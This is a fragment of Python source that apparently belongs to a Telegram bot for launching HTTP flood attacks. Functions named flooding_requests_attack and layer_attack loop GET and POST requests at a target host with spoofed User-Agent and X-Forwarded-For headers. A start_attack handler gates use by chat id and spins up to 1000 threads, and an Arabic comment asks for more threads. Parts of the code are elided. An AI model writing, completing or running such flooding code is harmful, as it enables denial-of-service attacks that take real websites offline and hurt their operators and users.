...
def flooding_requests_attack(host):
    ...
    try:
        while attack_in_progress:
            scraper.get(f"https://{host}", headers={
                'User-Agent': random_user_agent(),
                'X-Forwarded-For': random_ip(),
                'Connection': 'keep-alive',
                'Accept': '*/*'
...
def layer_attack(host):
    ...
    try:
        while attack_in_progress:
            scraper.post(f"https://{host}", data={"key": "value"}, headers={
                'User-Agent': random_user_agent(),
                'X-Forwarded-For': random_ip(),
                'Connection': 'keep-alive',
                'Accept': '*/*'
...
def start_attack(message):
    ...
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        try:
            ...
            with ThreadPoolExecutor(max_workers=1000) as executor:  # عدد أكبر من الخيوط
                while attack_in_progress:
